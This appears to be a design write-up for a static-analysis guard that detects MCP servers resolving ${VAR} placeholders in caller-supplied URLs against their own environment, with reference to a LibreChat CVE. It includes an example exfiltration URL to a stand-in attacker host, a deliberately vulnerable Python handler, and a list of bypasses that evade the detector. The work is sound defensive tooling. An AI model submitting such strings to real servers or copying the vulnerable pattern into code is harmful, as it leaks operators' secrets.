---
type: Guard
title: "mcp-env-placeholder-exfil"
description: "MCP server resolves ${VAR} placeholders in user-supplied config against its own process environment."
timestamp: "2026-10-24T00:00:00Z"
guard_id: "mcp-env-placeholder-exfil"
checklist_section: ["4"]
standards: ["CWE-200", "OWASP:A02", "OWASP-ASI:ASI04"]
---

# MCP server resolves ${VAR} placeholders against its own process environment

_Author — 2026-09-22_

---

## The threat

An MCP server that accepts a user-supplied config value — typically a server URL — and resolves
`${VAR}`/`$VAR` placeholders inside that value against its OWN process environment leaks its own
secrets to whoever controls the string. An authenticated user submits
`https://attacker.example/?k=${JWT_SECRET}` as their "server URL," and the server, while
validating or normalizing that value, expands `${JWT_SECRET}` against its own `process.env` and
sends the result — its own secret, now embedded in an outbound request to an attacker-controlled
host. The placeholder resolver has no way to distinguish "an admin's trusted config template"
from "an attacker's submitted string"; it just expands whatever it's given.

**CVE-2026-32625** (LibreChat <= 0.8.3, CVSS **9.6**, CWE-200) is the real-world instance: the
server resolved `${VAR}` against `process.env` during Zod validation of a user-supplied MCP
server URL, leaking `CREDS_KEY`, `JWT_SECRET`, `MONGO_URI`. WHO reaches this: any authenticated
user who can register or edit an MCP server entry pointing at a URL the server will resolve. WHAT
privilege: read access to any environment variable name the attacker can guess or enumerate. TO
WHAT EFFECT: credential exfiltration to an attacker-controlled endpoint, no further exploitation
needed beyond submitting a string. Standards: OWASP:A02 (Cryptographic Failures/sensitive-data
exposure), CWE-200 (Exposure of Sensitive Information), OWASP-ASI:ASI04 (Agentic Supply Chain
Vulnerabilities — an MCP server config value an attacker can influence becomes a secrets leak the
moment it is resolved).

## Why it's often introduced / Why this guard fits the stack

Template/placeholder expansion against the environment is a completely ordinary, useful pattern
for *operator-authored* config: a deployment template that says `"url": "https://${INTERNAL_HOST}/mcp"`
and gets expanded once at load time is exactly how you avoid hardcoding an environment-specific
value. The bug is applying that same expansion machinery to a value that arrived from a *caller*
rather than from the operator's own config file:

```python
# Safe: expanding the OPERATOR's own template at load time.
config = json.loads(Path("mcp-servers.json").read_text())
resolved_url = os.path.expandvars(config["server_url"])   # config is trusted

# Vulnerable: expanding a CALLER-SUPPLIED value.
@app.post("/mcp/servers")
def register_server(server_url: str):                      # attacker-controlled
    resolved = os.path.expandvars(server_url)               # now expands their placeholders
    return connect(resolved)
```

Both calls look identical to `os.path.expandvars()` — the function has no concept of "trusted"
vs. "untrusted" input, so the vulnerability is entirely about *which value* reaches it, not
anything visible in the call itself. A generic secret-scanning guard can't catch this: no secret
is hardcoded anywhere in the source; the leak only happens at runtime, driven by attacker input.

## Detection design

1. **`applies()` gate:** `"mcp" in profile.features` — MCP-specific, matching the guard family
   (`mcp-config-security`, `mcp-tool-env-inheritance`, `mcp-tool-unverified`).
2. **File-level MCP-context gate (`_MCP_CTX_RE`):** in addition to the `applies()` stack gate,
   each scanned FILE must itself reference `mcp`, `modelcontextprotocol`, `McpServer`,
   `StdioServerParameters`, `mcpServers`, or a `server[_-]?url`/`serverUrl`-shaped identifier —
   verbatim from `agent-audit-kit`'s real source. This is the precision control: `os.path.
   expandvars()` is a completely ordinary stdlib call used for all kinds of path/config
   resolution outside any MCP context, and without this gate the guard would fire on every
   unrelated use of it in the repo.
   **Per-call context (PR #923 rounds 2-4).** Passing the file-level gate is not enough on its
   own. A candidate call fires when an MCP marker sits within ±15 lines of it (on the Python
   side that window reads raw text, so the enclosing function's docstring counts). In Python it
   also fires when the file really uses the MCP SDK (`_MCP_SDK_USE_RE`: a `mcp`/`fastmcp` import
   or a low-level `@x.call_tool` / `@x.list_tools` decorator, read with comments and docstrings
   blanked) AND the call sits inside an MCP tool handler: its innermost enclosing function is
   decorated `@x.call_tool` / `@x.tool` / `@x.resource` / `@x.prompt`, read from the AST in one
   pass per file. A handler receives caller-supplied arguments, which is exactly the threat. So
   a real server's long `@server.call_tool()` handler fires however far its import sits above
   it, while an unrelated cache-dir helper in the same file, a factory that merely registers a
   nested handler, or a docstring/comment/string/parameter that says "MCP" or `server_url` 30
   lines away does not. Two broader fallbacks were each measured firing CRITICAL on benign code:
   "any marker in code" and "SDK use anywhere in the file". **TS/JS is window-only.** Three
   regex-built handler-span schemes (the registration's parentheses, a handler passed by name)
   each broke on ordinary code: a regex literal such as `/[(]/` or `/\(/` unbalanced them, and a
   `this.handle` callback escaped them. Without a TS parser this guard keeps the proximity gate
   alone for TS/JS. Every candidate is considered, and the finding anchors on the first one that
   qualifies, so an unrelated `expandvars` near the top of the file no longer hides a real one
   next to `server_url` further down. A call whose argument (or `.format` receiver) is a plain
   string literal is never a candidate: it is fixed at read time.
3. **Files scanned:** `iter_files(root, (".py", ".ts", ".tsx", ".js", ".mjs", ".cjs"))` —
   cross-language, since the CVE is a TypeScript codebase (LibreChat) and the pattern is
   language-symmetric.
4. **Patterns (verbatim from the real source's regexes):**
   - **Python** — `_PY_EXPANDVARS_RE` (`\bos\.path\.expandvars\s*\(`) or `_PY_FORMAT_ENV_RE`
     (`\.format(?:_map)?\s*\(\s*(?:\*\*\s*os\.environ\b|os\.environ\s*\))`) — `os.path.
     expandvars()` expands `$VAR`/`${VAR}` against `os.environ`; `.format(**os.environ)` /
     `.format_map(os.environ)` spread the whole environment into a template string.
   - **TS/JS** — `_TS_ENV_PLACEHOLDER_RE`: a `.replace(` call whose first argument carries a
     `${` placeholder and whose replacer (within the same call, up to 200 chars later,
     escaping-tolerant) reads `process.env`. Comments are stripped first (`strip_js_comments`)
     so a comment mentioning `process.env` cannot mask the check. **Live code only (#1055):** the
     `(` of `.replace(` and the replacer's `process.env` must both be live code on the anchor mask
     (`js_code_matches` over `strip_js_comments(text, strip_strings=True,
     keep_substitutions=True)`). A whole call spelled out in a docs string, or a
     `'process.env ...'` string passed as the replacement, no longer fires CRITICAL; a call inside
     a `${...}` substitution still does. The regex stops at the first `process.env` after the
     placeholder, so the replacer is looked for again over the regex's own reach (cut at a `;`):
     a `'process.env'` string before the real read cannot hide it. The `${` placeholder is not
     tested, since it lives in the pattern argument, a string or regex literal by nature, and the
     MCP-context gate stays a plain match (a `'mcpServers'` key or a `serverUrl` string is real
     evidence).
5. **File-level scan, not line-level:** unlike most agentsec guards, the pattern search runs
   against the whole file text (`re.search`, `re.DOTALL` on the TS regex) rather than
   line-by-line — a `.replace()` call's placeholder and its `process.env` replacer are commonly
   on different lines or split across a multi-line arrow function. The line number reported is
   computed from the match offset (`text[:m.start()].count("\n") + 1`).
6. **Inline opt-out pragma:** `# security: allow-mcp-env-placeholder-exfil`, file-level (checked
   once per file, same convention as `mcp-tool-env-inheritance`). It is matched as a plain
   substring, so the `// security: ...` form works in a TS/JS file.
7. **Severity/standards:** `critical` (CVSS 9.6 in the real-world instance), `["OWASP:A02",
   "CWE-200", "OWASP-ASI:ASI04"]`. Rule id: `mcp-env-placeholder-exfil/env-placeholder-resolution`.

## When NOT to flag

- **No MCP-context marker in the file.** `os.path.expandvars()` used for an unrelated path/config
  purpose (build scripts, file-path resolution) outside any MCP-related file stays silent — the
  file-level context gate exists exactly for this.
- **The file's only MCP mention is a distant comment or docstring.** A module docstring saying
  "also used by our MCP integration" 30 lines above a log-path helper's `expandvars(raw)` is not
  evidence that call handles MCP server config.
- **Reading a single named environment variable by key**
  (`os.environ.get("MCP_SERVER_URL", default)`) — this reads a variable the *operator* named, not
  expanding placeholders found inside a caller-supplied string.
- **An ordinary `.replace()` call that never reads `process.env`** (e.g. trimming a trailing
  slash) — `_TS_ENV_PLACEHOLDER_RE` requires the replacer to actually read `process.env` within
  the same call.
- An audited, trusted case suppressed with the inline pragma.

Use the pragma `# security: allow-mcp-env-placeholder-exfil` for a genuinely trusted case (e.g.
resolving a placeholder inside an operator-authored config template that a caller cannot
influence).

## Tests

| Test | What it checks |
|---|---|
| `test_fires_on_python_expandvars_in_mcp_context` | `os.path.expandvars(server_url)` in an MCP-context file fires — CVE-2026-32625's own shape |
| `test_fires_on_python_format_env` | `.format(**os.environ)` fires |
| `test_fires_on_python_format_map_environ` | `.format_map(os.environ)` fires |
| `test_fires_on_ts_replace_process_env_in_mcp_context` | TS `.replace(/\${.../, ...process.env)` fires |
| `test_no_mcp_context_python_expandvars_is_safe` | FP-bait: `expandvars()` with no MCP-context marker in the file stays silent |
| `test_long_handler_in_a_real_server_still_fires` | still-fires: the call sits deeper than the window into a real server's handler |
| `test_real_call_after_an_unrelated_distant_call_fires_on_the_real_one` | still-fires, anchored on the real call, not an earlier unrelated one |
| `test_bare_variable_with_distant_comment_only_mcp_signal_is_safe` | FP-bait: a distant `#` comment is not a code marker |
| `test_ts_distant_jsdoc_only_mcp_signal_is_safe` | FP-bait, TS: a distant JSDoc mention is not a code marker |
| `test_low_level_call_tool_decorator_counts_as_sdk_use` | still-fires: `@server.call_tool()` is SDK use with no `from mcp` import in the file |
| `test_fastmcp_import_far_above_a_tool_function_still_fires` | still-fires: a FastMCP import is SDK use however far above the call |
| `test_distant_marker_that_is_not_sdk_use_is_safe` | FP-bait: a distant single-line string, unrelated `server_url` parameter, or TS string is not SDK use |
| `test_unrelated_call_in_an_sdk_file_outside_any_handler_is_safe` | FP-bait: in a file that imports the SDK, a helper (plain or with a non-handler decorator), a handler-registering factory, or TS code far from any marker (including after a handler whose `/[(]/` regex once swallowed the rest of the file) does not fire |
| `test_handler_nested_in_a_registration_factory_still_fires` | still-fires: the innermost function decides, so a handler inside a `register(app)` factory counts |
| `test_handler_decorated_def_with_a_triple_quoted_default_still_fires` | still-fires: decorators are read from the AST, so a string default on the `def` line cannot hide them |
| `test_bom_prefixed_server_still_fires_inside_a_long_handler` | still-fires: a leading UTF-8 BOM (which `ast.parse` rejects) is stripped before any view is built |
| `test_handler_lines_are_parsed_at_most_once_per_file` / `test_handler_fallback_stays_linear_in_candidates` | performance pins: one parse per file (none without a handler decorator), and a set lookup per candidate (two earlier drafts measured quadratic) |
| `test_non_mcp_tool_decorator_without_sdk_use_is_safe` | FP-bait: `@agent.tool` (pydantic-ai) counts as a handler only in a file that uses the MCP SDK |
| `test_named_variable_read_is_safe` | FP-bait: reading one named env var by key stays silent |
| `test_ts_replace_without_process_env_is_safe` | FP-bait: an ordinary `.replace()` that never reads `process.env` stays silent |
| `test_pragma_suppresses_finding` | the inline pragma silences the finding |
| `test_guard_not_applicable_without_mcp_feature` | `applies()` is False without the `mcp` feature |
| `test_guard_applicable_with_mcp_feature` | `applies()` is True with the `mcp` feature |
| `test_nonproduct_path_skipped` | files under `tests/fixtures/` are skipped |
| `test_ts_candidate_spelled_in_a_string_is_safe` | #1055 FP direction: the whole call in a string or template text, or a real call whose only `process.env` is a string — silent |
| `test_ts_real_candidate_still_fires` | #1055: the real call fires, including one nested in `${...}`, one after a quoted copy, and one whose real `process.env` follows a quoted one in the same call |
| `test_ts_pragma_still_suppresses_a_code_anchored_candidate` | the pragma still silences a finding the anchor rule kept |

## Known bypasses

- **Non-literal MCP-context markers.** The file-level gate is a fixed keyword regex
  (`_MCP_CTX_RE`); a file that handles MCP server URLs but never spells any of the gated tokens
  (an unusually-named variable, a re-exported helper with no MCP-suggestive name) gets no
  coverage from this guard.
- **A bare variable is assumed caller-supplied.** Within 15 lines of an MCP marker, or inside a
  tool handler, every non-literal `expandvars(x)` fires, including one whose `x` is a local
  constant a few lines up. There is no taint tracking, so this errs toward firing (a false
  positive, not a miss).
- **A far-away call outside a handler (Python).** Beyond the 15-line window, only a call inside
  a tool handler of a file that uses the SDK is caught. A helper the handler calls (the value
  reaches `expandvars` one call away), a closure nested inside a handler (the innermost function
  is the undecorated closure), or a module that handles MCP config but imports no SDK is missed.
- **TS/JS beyond the window.** A `.replace(...process.env...)` more than 15 lines from any MCP
  marker is missed, even inside a `server.tool(...)` / `setRequestHandler(CallToolRequestSchema,
  ...)` handler or a handler passed by name (`this.handle.bind(this)`). Measured silent; this is
  the `e6f95e89` behaviour, kept deliberately (see "Per-call context").
- **Decorators are matched by attribute name, not receiver (false positive, Python).** In a
  file that uses the MCP SDK anywhere, another library's `@agent.tool` (pydantic-ai) counts as a
  tool handler, so an `expandvars` inside it fires. Measured, and unchanged from before the
  handler rule.
- **Indirection.** `resolver = os.path.expandvars; resolver(server_url)` — assigning the
  function to a variable before calling it is not matched; the regex requires the literal
  `os.path.expandvars(` call shape.
- **Non-stdlib placeholder expansion.** A hand-rolled placeholder resolver (a manual
  `re.sub(r"\$\{(\w+)\}", lambda m: os.environ[m.group(1)], value)`) achieves the identical
  vulnerability without matching either the `expandvars`/`format` patterns (Python) or the
  `.replace(...process.env)` shape (TS) this guard looks for.
- **Cross-file resolution.** If the placeholder-expansion call and the MCP-context marker live in
  different files (a generic `utils/template.py` helper called from an MCP-specific caller with
  no MCP marker of its own), the guard only sees the single file it's scanning and may miss the
  connection.
- **TS/JS anchoring (#1055).** Residual: the anchor mask inherits the #543 sub-lexer residual: a `{` inside a regex or comment in one `${...}` substitution, then a `}` in a later one, rebalances the frame, so the code between the two reads as template text and an anchor there is not code (the accepted trade pinned by `test_strip_js_comments_anchor_mask_balanced_desync_masks_code_accepted_trade`); a candidate there is missed, which errs
  toward silence. A yielded `.replace(` match that fails the replacer check still consumes its
  span, so a second `.replace(` call starting inside that span and reading `process.env` more
  than the regex's reach past the first placeholder is missed (not seen in practice).
- **Non-JS/TS/Python MCP servers** (Go, Rust, Java implementations) are not covered — this guard
  is Python + TS/JS source only in v1, matching the real source's own language scope.

## What this guard does NOT prove

- That every environment-variable read in the codebase is safe — this guard only targets the
  specific "expand a placeholder found inside untrusted input against the process environment"
  shape, not general secret handling.
- That the MCP server's config-registration endpoint has proper authentication — a server that
  requires no auth to register a new MCP server entry compounds this bug but is a separate,
  unguarded concern.
- That the eventual outbound request (carrying the leaked secret) is itself detected — this guard
  fires at the resolution point, before any network call; `ssrf-general` and the MCP SSRF
  guards address the outbound-fetch side separately.

# Citations

[1] agentsec checklist item `4-mcp-env-placeholder-exfil` (§4)
[2] CWE-200
[3] OWASP:A02
[4] OWASP-ASI:ASI04
[5] CVE-2026-32625 (LibreChat <= 0.8.3, MCP server URL placeholder resolution, CVSS 9.6)
[6] agent-audit-kit (sattyamjjain/agent-audit-kit), `mcp_env_placeholder_exfil.py`
